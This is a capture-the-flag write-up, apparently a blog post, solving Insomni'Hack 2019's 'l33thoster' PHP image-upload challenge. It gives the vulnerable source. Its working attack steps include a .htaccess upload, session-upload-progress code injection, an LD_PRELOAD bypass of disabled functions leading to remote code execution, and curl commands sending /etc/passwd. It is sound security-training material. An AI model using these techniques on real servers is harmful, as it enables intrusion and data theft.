@@ -1,0 +1,176 @@
+I"(S<h1 id="description">Description</h1>
+<p>You can host your l33t pictures <a href="http://http://35.246.234.136/">here</a>.</p>
+
+<h1 id="the-challenge">The Challenge</h1>
+<p>This challenge was a PHP challenge that allowed users to upload files in custom folder, the source code was given :</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"source"</span><span class="p">]))</span> 
+    <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
+
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">20</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">"images/</span><span class="si">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"home"</span><span class="p">]</span><span class="si">}</span><span class="s2">/"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nv">$disallowed_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="s2">"php"</span><span class="p">,</span>
+    <span class="s2">"php3"</span><span class="p">,</span>
+    <span class="s2">"php4"</span><span class="p">,</span>
+    <span class="s2">"php5"</span><span class="p">,</span>
+    <span class="s2">"php7"</span><span class="p">,</span>
+    <span class="s2">"pht"</span><span class="p">,</span>
+    <span class="s2">"phtm"</span><span class="p">,</span>
+    <span class="s2">"phtml"</span><span class="p">,</span>
+    <span class="s2">"phar"</span><span class="p">,</span>
+    <span class="s2">"phps"</span><span class="p">,</span>
+<span class="p">);</span>
+
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"upload"</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'image'</span><span class="p">][</span><span class="s1">'error'</span><span class="p">]</span> <span class="o">!==</span> <span class="no">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"yuuuge fail"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">];</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"image"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
+    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+    <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="nb">array_shift</span><span class="p">(</span><span class="nv">$parts</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$parts</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol filename is empty"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span> <span class="nv">$disallowed_ext</span><span class="p">,</span> <span class="kc">TRUE</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol nice try, but im not stupid dude..."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$image</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$image</span><span class="p">,</span> <span class="s2">"&lt;?"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">FALSE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"why would you need php in a pic....."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">exif_imagetype</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"not an image."</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$image_size</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$image_size</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span> <span class="o">||</span> <span class="nv">$image_size</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1337</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">"lol noob, your pic is not l33t enough"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$parts</span><span class="p">);</span>
+    <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$userdir</span> <span class="mf">.</span> <span class="nv">$name</span> <span class="mf">.</span> <span class="s2">"."</span> <span class="mf">.</span> <span class="nv">$ext</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;h3&gt;Your &lt;a href=</span><span class="nv">$userdir</span><span class="s2">&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;"</span><span class="p">;</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nb">glob</span><span class="p">(</span><span class="nv">$userdir</span> <span class="mf">.</span> <span class="s2">"*"</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"&lt;li&gt;&lt;a href='</span><span class="nv">$file</span><span class="s2">'&gt;</span><span class="nv">$file</span><span class="s2">&lt;/a&gt;&lt;/li&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="s2">"&lt;/ul&gt;"</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;h1&gt;</span>Upload your pics!<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"?"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"image"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">name=</span><span class="s">upload</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="c">&lt;!-- /?source --&gt;</span>
+1
+</code></pre></div></div>
+
+<h2 id="ideas">Ideas</h2>
+
+<p>My first thought was that the extension check was done without case check so changing the case could work.</p>
+
+<p>Also the challenge suggested we couldn’t use php tags <code class="language-plaintext highlighter-rouge">&lt;?</code>, and  we need to make the file look like an image (bypass <code class="language-plaintext highlighter-rouge">exif_imagetype</code>) with defined size <code class="language-plaintext highlighter-rouge">1337x1337</code></p>
+
+<h1 id="solving-the-challenge">Solving the challenge</h1>
+
+<p>The challenge is basically asking for a <code class="language-plaintext highlighter-rouge">.htaccess</code> upload while bypassing all restrictions, we need a valid image header that will not break <code class="language-plaintext highlighter-rouge">.htaccess</code> syntax, which is <code class="language-plaintext highlighter-rouge">wbmp</code> because it starts with a null byte and <code class="language-plaintext highlighter-rouge">.htaccess</code> will ignore that line, we craft our <code class="language-plaintext highlighter-rouge">.htaccess</code> file and add a directive to make our custom extension files be interpreted as <code class="language-plaintext highlighter-rouge">PHP</code>.
+<img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen1.png" alt="screen1.png" />
+We do the same thing to upload our php file with the custom extension the content isn’t important.
+<img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen2.png" alt="screen2.png" /></p>
+
+<p>The next step is to edit <code class="language-plaintext highlighter-rouge">.htaccess</code> file and add two more directives, the first one is disable php session upload_progress cleanup, and the second one is append file which will be a custom session one.</p>
+
+<p><img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen3.png" alt="screen3.png" />
+Note that PHP_SESSION_UPLOAD_PROGRESS will create a session file for me, and disabling the cleanup will not remove my files so I don’t need to do any kind of race conditions.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-vvv</span> http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=xyz'</span> <span class="nt">-F</span> <span class="s2">"PHP_SESSION_UPLOAD_PROGRESS=whatever"</span> <span class="nt">-F</span> <span class="s2">"file=@/etc/passwd"</span>
+</code></pre></div></div>
+<p>Now requesting our <code class="language-plaintext highlighter-rouge">.xyz</code> file in the browser shows some serialized data with interested reflected values
+<img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen4.png" alt="screen4.png" />
+so the file parameter is reflected here it’s <code class="language-plaintext highlighter-rouge">file</code> and also whatever I put in PHP_SESSION_UPLOAD_PROGRESS, i’m gonna use one of them to inject my php code.
+I’m going to intercept my curl request in burp and edit one of the parameters.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">http_proxy</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8080/"</span>
+curl <span class="nt">-vvv</span> http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz <span class="nt">-H</span> <span class="s1">'Cookie: PHPSESSID=xyz'</span> <span class="nt">-F</span> <span class="s2">"PHP_SESSION_UPLOAD_PROGRESS=whatever"</span> <span class="nt">-F</span> <span class="s2">"file=@/etc/passwd"</span>
+</code></pre></div></div>
+<p><img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen5.png" alt="screen5.png" />
+I changed the PHPSESSID value because the old one wasn’t deleted, so we need to use a new one, need to change it in <code class="language-plaintext highlighter-rouge">.htaccess</code> as well.
+Let’s request our file in the browser and enjoy RCE.
+<img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen6.png" alt="screen6.png" />
+Trying various command execution functions results in nothing so we’d better check <code class="language-plaintext highlighter-rouge">phpinfo</code>
+<img src="/assets/2019-01-21-Insomni'Hack-l33thoster-Writeup/screen8.png" alt="screen8.png" /></p>
+
+<p>It seems that <code class="language-plaintext highlighter-rouge">mail()</code> and <code class="language-plaintext highlighter-rouge">putenv()</code> aren’t filtered, so we could overwrite <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> to our custom <code class="language-plaintext highlighter-rouge">.so</code> file and overwrite some function that mail calls.</p>
+
+<p>I stumbeled across another problem of how to upload a valid <code class="language-plaintext highlighter-rouge">.so</code> file since we didn’t have arbitrary upload , also <code class="language-plaintext highlighter-rouge">file_put_contents</code> and other file manipulation functions were filtered, the solution was to upload the file using our php script and <code class="language-plaintext highlighter-rouge">move_uploaded_file</code> function. 
+<em>for more details about compiling and generating .so file please check https://corb3nik.github.io/blog/alictf-2016/homework</em></p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-vvv</span> <span class="s1">'http://35.246.234.136/images/cce36633671a3a556973a0b2d3592fe4371a5bde/test.xyz?0=move_uploaded_file($_FILES[%22image%22][%22tmp_name%22],%20%22/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so%22);'</span> <span class="nt">-F</span> <span class="s1">'image=@hack.so'</span> <span class="nt">-g</span>
+</code></pre></div></div>
+<p>Next we need to execute the following PHP code to get shell command execution.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">echo</span> <span class="nb">putenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD=/var/www/html/images/cce36633671a3a556973a0b2d3592fe4371a5bde/hack.so"</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="nb">putenv</span><span class="p">(</span><span class="s2">"exec="</span><span class="mf">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+  <span class="k">echo</span> <span class="nb">mail</span><span class="p">(</span><span class="s2">"a"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">);</span>
+  <span class="nb">show_source</span><span class="p">(</span><span class="s2">"/tmp/out.txt"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>I have used a perl payload to get reverse shell, the final step was to bypass the captcha  in the <code class="language-plaintext highlighter-rouge">get_flag</code> binary in an automated way , I have used <code class="language-plaintext highlighter-rouge">PHP</code> for this.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+
+        <span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+           <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  
+           <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  
+           <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"file"</span><span class="p">,</span> <span class="s2">"/tmp/error-output.txt"</span><span class="p">,</span> <span class="s2">"a"</span><span class="p">)</span>
+        <span class="p">);</span>
+
+        <span class="nv">$cwd</span> <span class="o">=</span> <span class="s1">'/'</span><span class="p">;</span>
+        <span class="nv">$env</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+
+        <span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="s1">'/get_flag'</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">,</span> <span class="nv">$env</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+
+            <span class="nv">$res</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s1">'return '</span><span class="mf">.</span><span class="nb">explode</span><span class="p">(</span><span class="s2">":"</span><span class="p">,</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1024</span><span class="p">))[</span><span class="mi">1</span><span class="p">]</span><span class="mf">.</span><span class="s1">';'</span><span class="p">);</span>
+
+            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$res</span><span class="p">);</span>
+            <span class="nf">close</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+
+            <span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1024</span><span class="p">);</span>
+
+            <span class="k">echo</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1024</span><span class="p">);</span>
+
+            <span class="nv">$return_value</span> <span class="o">=</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+        <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-f</span> /tmp/file.php
+
+INS<span class="o">{</span>l33t_l33t_l33t_ich_hab_d1ch_li3b<span class="o">}</span>
+</code></pre></div></div>
+<p>The flag is <code class="language-plaintext highlighter-rouge">INS{l33t_l33t_l33t_ich_hab_d1ch_li3b}</code>.</p>
+:ET
